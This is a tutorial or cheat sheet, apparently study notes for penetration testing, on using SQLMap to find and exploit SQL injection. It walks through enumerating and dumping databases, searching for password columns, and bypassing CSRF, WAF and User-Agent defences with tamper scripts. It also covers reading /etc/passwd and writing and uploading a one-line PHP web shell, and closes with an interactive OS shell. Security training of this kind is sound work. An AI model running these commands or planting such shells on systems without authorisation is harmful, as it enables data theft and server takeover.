**SQLMap** is an open-source penetration testing tool used to **detect and exploit SQL Injection vulnerabilities automatically**.

It supports a wide variety of database management systems and automates the entire SQLi exploitation process, including:

- Detection of SQL injection vulnerabilities
    
- Database fingerprinting
    
- Database enumeration
    
- Data extraction
    
- File system access
    
- Operating system command execution (in some cases)


---

## Basic Usage

The most common way to use SQLMap is by providing a **URL containing parameters**.

| Option      | Description                                               |
| ----------- | --------------------------------------------------------- |
| `-u`        | Specifies the target URL to test                          |
| `--batch`   | Runs SQLMap automatically without asking for confirmation |
| `--dbs`     | Enumerates available databases                            |
| `--tables`  | Lists tables from a database                              |
| `--columns` | Lists columns from a table                                |
| `--dump`    | Extracts data from a table                                |
| `--forms`   | Tells SQLMap to test parameters found in HTML forms       |

```bash
sqlmap -u http://192.168.1.102/administrator --forms --dbs --batch
```

---

## Basic Enumeration Process

SQLMap exploitation usually follows this workflow:

1. Enumerate databases
    
2. Enumerate tables
    
3. Enumerate columns
    
4. Dump data
    

### 1. Enumerate Databases

```bash
sqlmap -u http://target/administrator --forms --dbs --batch
```


### 2. Enumerate Tables

|Option|Description|
|---|---|
|`-D`|Specifies the target database|
|`--tables`|Lists tables inside the database|

```bash
sqlmap -u http://target/administrator -D <database_name> --tables --batch
```


### 3. Enumerate Columns

|Option|Description|
|---|---|
|`-T`|Specifies the table|
|`--columns`|Lists columns of the table|

```bash
sqlmap -u http://target/administrator \
-D <database_name> \
-T <table_name> \
--columns --batch
```

### 4. Dump Data

|Option|Description|
|---|---|
|`-C`|Specifies which columns to extract|
|`--dump`|Extracts the data|

```bash
sqlmap -u http://target/administrator \
-D <database_name> \
-T <table_name> \
-C column1,column2 \
--dump --batch
```

---

## Level and Risk

These options control **how aggressive SQLMap testing is**.

|Option|Description|
|---|---|
|`--level (1-5)`|Defines how many parameters and tests SQLMap performs|
|`--risk (1-3)`|Defines how risky the payloads are|

### Level Values

|Level|Description|
|---|---|
|1|Basic tests|
|2|Additional vectors|
|3|Advanced testing|
|4|Extensive tests|
|5|All possible vectors|

### Risk Values

|Risk|Description|
|---|---|
|1|Low risk payloads|
|2|Medium risk|
|3|Potentially dangerous techniques|

Example:

```bash
sqlmap -u http://target/item.php?id=1 --level 5 --risk 3 --dbs
```

---

## Using SQLMap with Burp Suite

Many web applications require **complex HTTP requests**, including:

- Cookies
    
- Authentication tokens
    
- Custom headers
    
- POST requests
    

In these cases, it is better to **save the full HTTP request**.

### Capturing a Request

Steps:

1. Intercept the request in **Burp Suite**
    
2. Right click → **Save item**
    
3. Save it as a file (e.g., `req.txt`)
    

Example request:

```http
GET /product.php?id=1 HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Cookie: PHPSESSID=12345
```

Then run SQLMap:

```bash
sqlmap -r req.txt
```

---

## Specifying a Vulnerable Parameter

If you already know the vulnerable parameter, use `-p`.

|Option|Description|
|---|---|
|`-p`|Specifies which parameter to test|

Example:

```bash
sqlmap -r req.txt -p id --dbs
```

This reduces unnecessary testing on other parameters.

---

## SQL Injection Techniques

SQLMap allows specifying which injection techniques should be used.

|Option|Description|
|---|---|
|`--technique`|Defines the SQLi techniques to test|

Available options:

|Letter|Technique|
|---|---|
|`U`|UNION-based|
|`B`|Boolean-based|
|`E`|Error-based|
|`T`|Time-based|
|`S`|Stacked queries|

Example:

```bash
sqlmap -r req.txt -p id --technique=U --dbs
```

---
## Advanced Enumeration
### DB Schema Enumeration

If you want a **full overview of the database structure**, including all tables and columns, you can use:

|Option|Description|
|---|---|
|`--schema`|Dumps the full database structure|

```bash
sqlmap -u "http://target/?id=1" --schema
```

This is useful for:

- Understanding database architecture
    
- Quickly identifying interesting tables
    
- Avoiding manual enumeration
    

### Searching for Data

When dealing with large databases, manual enumeration becomes inefficient. SQLMap provides a **search feature**.

|Option|Description|
|---|---|
|`--search`|Searches for databases, tables, or columns|
|`-T`|Search tables by name|
|`-C`|Search columns by name|

### Search for tables

```bash
sqlmap -u "http://target/?id=1" --search -T user
```

### Search for columns

```bash
sqlmap -u "http://target/?id=1" --search -C pass
```

This is extremely useful to find:

- `users` tables
    
- `password` columns
    
- authentication-related data

---

## Using Cookies

If the application requires authentication, session cookies must be included.

|Option|Description|
|---|---|
|`--cookie`|Adds cookies to the request|

Example:

```bash
sqlmap -u http://target/dashboard.php?id=1 \
--cookie="PHPSESSID=abcd1234"
```

Another way is using headers:

```bash
sqlmap -u http://target/page.php?id=1 \
-H="Cookie: PHPSESSID=abcd1234"
```

---

## Testing POST Parameters

If the application uses **POST requests**, use the `--data` option.

```bash
sqlmap -u http://target/login.php \
--data="username=test&password=test"
```

SQLMap will test both parameters.

If only one parameter should be tested:

```bash
sqlmap -u http://target/login.php \
--data="username=test&password=test" \
-p username
```

---

## Injection Point Marker

You can manually specify the injection point using `*`.

Example:

```bash
sqlmap -u http://target/page.php \
--data="id=1*&name=test"
```

The `*` indicates the **exact injection position**.

---

## Multithreading

SQLMap can speed up exploitation using multiple threads.

|Option|Description|
|---|---|
|`--threads`|Number of concurrent requests|

Example:

```bash
sqlmap -u http://target/item.php?id=1 --threads 5
```


---

## Bypassing Web Application Protections

In real-world scenarios, web applications often implement protections that can **interfere with automated SQLi exploitation**.

SQLMap includes multiple features to help bypass these mechanisms.


### Anti-CSRF Token Bypass

Some applications include **anti-CSRF tokens** in requests to prevent automation.

These tokens:

- Change on each request
    
- Must be valid to be accepted by the server
    

|Option|Description|
|---|---|
|`--csrf-token`|Specifies the CSRF token parameter name|

Example:

```bash
sqlmap -u "http://target/" \
--data="id=1&csrf-token=abcd1234" \
--csrf-token="csrf-token"
```

SQLMap will:

- Extract fresh tokens from responses
    
- Automatically update them in future requests
    

### Unique Value Bypass

Some applications require **unique values per request** (anti-automation protection).

|Option|Description|
|---|---|
|`--randomize`|Randomizes a parameter value in each request|

Example:

```bash
sqlmap -u "http://target/?id=1&rp=12345" \
--randomize=rp --batch
```

This helps bypass:

- Replay protections
    
- Simple anti-CSRF mechanisms
    

### Calculated Parameter Bypass

Some applications expect parameters that are **calculated dynamically** (e.g., hashes).

Example:

- `h = md5(id)`
    

|Option|Description|
|---|---|
|`--eval`|Executes Python code before sending the request|

Example:

```bash
sqlmap -u "http://target/?id=1&h=hash" \
--eval="import hashlib; h=hashlib.md5(id).hexdigest()" \
--batch
```

This ensures:

- Parameters remain valid
    
- Requests are accepted by the server
    

### WAF Detection and Bypass

SQLMap automatically checks for **Web Application Firewalls (WAFs)**.

Indicators of WAF presence:

- HTTP errors (e.g., 403, 406)
    
- Different response behavior
    

|Option|Description|
|---|---|
|`--skip-waf`|Skips WAF detection tests|

```bash
sqlmap -u http://target/?id=1 --skip-waf
```


### User-Agent Blacklisting Bypass

Some applications block requests based on the default SQLMap User-Agent.

|Option|Description|
|---|---|
|`--random-agent`|Uses a random User-Agent|

```bash
sqlmap -u http://target/?id=1 --random-agent
```

This mimics real browser traffic and helps avoid detection.


### Tamper Scripts

Tamper scripts modify payloads to **bypass filters and WAFs**.

|Option|Description|
|---|---|
|`--tamper`|Applies tamper scripts|

Example:

```bash
sqlmap -u http://target/?id=1 \
--tamper=between,randomcase
```

#### Common Tamper Scripts

|Script|Description|
|---|---|
|`randomcase`|Randomizes keyword case|
|`between`|Replaces operators with BETWEEN|
|`space2comment`|Replaces spaces with comments|
|`space2dash`|Uses inline comments instead of spaces|
|`equaltolike`|Replaces `=` with `LIKE`|
|`percentage`|Encodes characters with `%`|
|`base64encode`|Encodes payload in Base64|

#### List all available tamper scripts

```bash
sqlmap --list-tampers
```


---

## OS Exploitation

SQLMap can leverage SQL Injection vulnerabilities to interact with the **underlying operating system**.

This includes:

- Reading local files
    
- Writing files to the server
    
- Potential command execution
    

### Checking for DBA Privileges

Higher privileges increase the chances of OS exploitation.

|Option|Description|
|---|---|
|`--is-dba`|Checks if current user has DBA privileges|

Example:

```bash
sqlmap -u "http://target/?id=1" --is-dba
```

Output:

```text
current user is DBA: True
```


### Reading Local Files

SQLMap simplifies file reading with a dedicated option.

|Option|Description|
|---|---|
|`--file-read`|Reads a file from the remote system|

Example:

```bash
sqlmap -u "http://target/?id=1" \
--file-read="/etc/passwd"
```

Retrieved files are stored locally:

```bash
~/.sqlmap/output/target/files/
```


### Writing Local Files

File writing is more restricted but can lead to **remote code execution**.

|Option|Description|
|---|---|
|`--file-write`|Local file to upload|
|`--file-dest`|Destination path on target|

#### Step 1: Create Web Shell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

#### Step 2: Upload Shell

```bash
sqlmap -u "http://target/?id=1" \
--file-write="shell.php" \
--file-dest="/var/www/html/shell.php"
```

### Command Execution

If the DBMS and underlying system allow it, SQLMap can provide **direct command execution** without manually uploading a shell.

|Option|Description|
|---|---|
|`--os-shell`|Provides an interactive OS shell|
|`--os-cmd`|Executes a single OS command|


#### Interactive OS Shell

```bash
sqlmap -u "http://target/?id=1" --os-shell
```

This will:

- Attempt different techniques (e.g., file write, UDF injection)
    
- Provide an interactive prompt
    
#### Single Command Execution

```bash
sqlmap -u "http://target/?id=1" \
--os-cmd="id"
```
